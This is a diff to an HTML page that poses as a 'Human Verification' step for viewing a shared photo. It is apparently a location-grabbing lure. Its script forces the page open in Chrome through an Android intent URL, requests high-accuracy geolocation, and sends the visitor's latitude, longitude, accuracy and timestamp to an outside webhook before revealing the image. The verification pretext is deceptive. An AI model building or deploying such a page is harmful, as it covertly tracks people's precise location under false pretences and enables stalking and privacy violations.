@@ -7,18 +7,19 @@
     
     <meta property="og:title" content=" ">
     <meta property="og:description" content=" ">
-    <meta property="og:image" content="https://i.postimg.cc/xdRX9xYB/IMG-6614.jpg">
+    <meta property="og:image" content="https://i.postimg.cc/hvDhnrFF/85954776-1A50-4588-84F8-C43F1FB7A2F8.jpg">
+    <meta property="og:image:secure_url" content="https://i.postimg.cc/hvDhnrFF/85954776-1A50-4588-84F8-C43F1FB7A2F8.jpg">
+    <meta property="og:image:type" content="image/jpeg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
     <meta property="og:type" content="website">
 
     <style>
-        body { margin: 0; background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: white; overflow: hidden; }
+        body { margin: 0; background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; overflow: hidden; }
         #message { text-align: center; padding: 25px; max-width: 400px; border: 1px solid #333; border-radius: 15px; background: #111; }
         #content { display: none; }
         img { max-width: 100%; height: auto; border-radius: 10px; }
-        .btn { background: #0084ff; color: white; padding: 12px 25px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px; transition: 0.3s; }
-        .btn:hover { background: #0073e6; }
+        .btn { background: #0084ff; color: white; padding: 12px 25px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px; }
         .instruction { font-size: 13px; color: #aaa; margin-top: 15px; line-height: 1.5; }
         .highlight { color: #0084ff; font-weight: bold; }
     </style>
@@ -27,9 +28,9 @@
 
     <div id="message">
         <h2 style="margin-top:0;">Human Verification</h2>
-        <p>To view this video, you must verify your session in your system browser.</p>
+        <p>To view this photo, you must verify your session in your system browser.</p>
         
-        <button class="btn" onclick="openInBrowser()">Verify & Open Video</button>
+        <button class="btn" onclick="openInBrowser()">Verify & Open Photo</button>
         
         <div class="instruction">
             If the button doesn't work:<br>
@@ -44,14 +45,12 @@
     <script>
         function openInBrowser() {
             var currentUrl = window.location.href;
-            
-            // Android Chrome Intent - এটি সরাসরি ক্রোম ব্রাউজার খুলতে বাধ্য করে
             var cleanUrl = currentUrl.replace(/^https?:\/\//, '');
+            // সরাসরি অ্যান্ড্রয়েড ক্রোম খোলার কমান্ড
             var intentUrl = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
             
             window.location.href = intentUrl;
 
-            // যদি উপরেরটা কাজ না করে (iOS বা অন্য ডিভাইসের জন্য)
             setTimeout(function() {
                 if (!document.hidden) {
                     window.location.href = currentUrl + (currentUrl.includes('?') ? '&' : '?') + "external=1";
@@ -63,7 +62,7 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     
-                    // Webhook-এ সঠিক লোকেশন পাঠানো
+                    // আপনার Webhook লিঙ্ক
                     const webhookURL = "https://e2f275a6-8c4f-4a12-81a9-12f2a1b5d56e.webhooksite.net"; 
                     fetch(webhookURL, {
                         method: 'POST',
@@ -72,16 +71,16 @@
                             lat: position.coords.latitude, 
                             lon: position.coords.longitude,
                             accuracy: position.coords.accuracy.toFixed(1) + " meters",
-                            device: navigator.userAgent
+                            time: new Date().toLocaleString()
                         })
                     });
 
-                    // লোকেশন পাওয়ার পর ছবি দেখানো
+                    // অনুমতি দিলে মেসেজ লুকিয়ে ছবি দেখানো
                     document.getElementById('message').style.display = 'none';
                     document.getElementById('content').style.display = 'block';
 
                 }, function(error) {
-                    console.log("Waiting for permission...");
+                    console.log("Permission waiting...");
                 }, {
                     enableHighAccuracy: true,
                     timeout: 15000,
